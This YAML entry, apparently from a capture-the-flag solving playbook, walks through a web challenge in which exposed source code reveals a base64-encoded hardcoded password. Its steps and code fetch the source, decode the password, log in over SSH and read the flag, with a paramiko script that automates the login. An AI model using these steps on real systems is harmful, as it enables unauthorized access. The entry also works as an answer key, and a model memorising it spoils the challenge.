name: hardcoded_credentials_disclosure
category: web
tags: [information_disclosure, hardcoded_credentials, ssh, base64]
indicators:
  - "/source endpoint exposes source code"
  - "base64.b64decode() encoded password"
  - "SSH service open"

tricks:
  - name: "Step 1: Discover source code exposure"
    when: "Hint: hardcoding credentials"
    how: "Try /source path"
    payload: |
      curl http://TARGET/source
      # Found:
      username = 'pedro'
      password = base64.b64decode(b'QUhlYXZ5U2FuZGJhZw==').decode('utf-8') + '!'

  - name: "Step 2: Decode Base64 password"
    when: "Found encoded password"
    how: "Base64 decode + append '!'"
    payload: |
      echo 'QUhlYXZ5U2FuZGJhZw==' | base64 -d
      # Output: AHeavySandbag
      # Full password: AHeavySandbag!

  - name: "Step 3: SSH login to get flag"
    when: "Got credentials"
    how: "SSH connect and read flag"
    payload: |
      ssh pedro@localhost -p 2222
      # Password: AHeavySandbag!
      cat /home/pedro/FLAG.txt

  - name: "Step 4: Automated exploit"
    when: "Automation"
    how: "Python exploit with paramiko"
    payload: |
      password = base64.b64decode(b'QUhlYXZ5U2FuZGJhZw==').decode() + '!'
      client = paramiko.SSHClient()
      client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      client.connect('localhost', port=2222, username='pedro', password=password)
      stdin, stdout, stderr = client.exec_command('cat /home/pedro/FLAG.txt')

